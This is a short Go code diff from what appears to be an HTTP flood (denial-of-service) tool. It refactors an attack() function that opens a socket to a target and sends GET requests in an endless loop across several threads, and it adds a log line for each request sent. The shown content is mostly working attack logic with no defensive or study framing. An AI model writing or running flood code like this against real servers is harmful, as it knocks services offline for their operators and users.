@@ -3,20 +3,16 @@ package main
 import (
 	"fmt"
 	"net"
+	"strings"
 )
-
-type address struct {
-	ip   string
-	port string
-}
 
 var NUM_THREADS int = 10
 
 // function to attack
-func attack(target_addr address) {
-	target := target_addr.ip + ":" + target_addr.port
+func attack(target string) {
 	target_socket := connectSocket(target)
-	request := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\n\r\n", target_addr.ip)
+	target_ip := strings.Split(target, ":")[0]
+	request := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\n\r\n", target_ip)
 	for {
 		if running == 1 {
 			sendMsg(target_socket, request)
@@ -44,6 +40,8 @@ func sendMsg(socket net.Conn, msg string) {
 	_, err := socket.Write([]byte(msg))
 	if err != nil {
 		fmt.Println(err)
+	} else {
+		fmt.Println("Sent " + msg)
 	}
 }
 
